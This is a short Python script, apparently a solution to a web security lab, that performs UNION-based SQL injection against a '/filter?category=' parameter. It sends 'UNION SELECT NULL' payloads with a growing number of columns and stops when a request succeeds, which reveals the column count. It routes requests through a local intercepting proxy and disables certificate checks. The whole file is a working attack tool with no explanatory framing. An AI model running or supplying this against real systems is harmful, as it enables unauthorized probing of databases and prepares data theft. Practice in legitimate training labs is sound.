import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    uri = url.rstrip('/') + '/filter?category='
    for i in range(1,10):
        sqli_payload = "' UNION SELECT NULL" + (i-1)*",NULL" + "--" 
        res = requests.get(uri + sqli_payload, verify=False, proxies=proxies)
        
        if res.status_code == 200:
            return i
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Usage: %s http://example.com' % sys.argv[0])
        sys.exit(-1)
    
    print('Figuring out the number of columns...')

    number_of_columns = exploit_sqli(url)
    if number_of_columns:
        print('[+] SQL Injection successfull. The number of columns is %s.' % str(number_of_columns))
    else:
        print('[-] SQL Injection failed!')